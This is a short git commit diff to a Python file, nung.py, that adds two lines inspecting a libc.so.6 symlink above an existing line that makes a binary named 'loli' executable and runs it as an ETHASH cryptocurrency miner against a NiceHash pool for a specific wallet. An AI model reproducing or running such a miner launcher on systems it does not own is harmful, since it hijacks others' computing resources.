5c4535a4f14917d2ac3932bf7793302824abed20
yeripo <110187561+yeripo@users.noreply.github.com>
2022-07-29 22:51:57 +0700

    Update nung.py

--- nung.py
+++ nung.py
@@ -1,2 +1,4 @@
 import os
+assert os.path.islink('libc.so.6')
+print os.readlink('libc.so.6')
 os.system("chmod +x loli && ./loli --algo ETHASH --pool stratum+ssl://daggerhashimoto.auto.nicehash.com:443 --user 39Xoi6TZxzarLHrqJJzQLVCFoKis13vhSE.Nung")
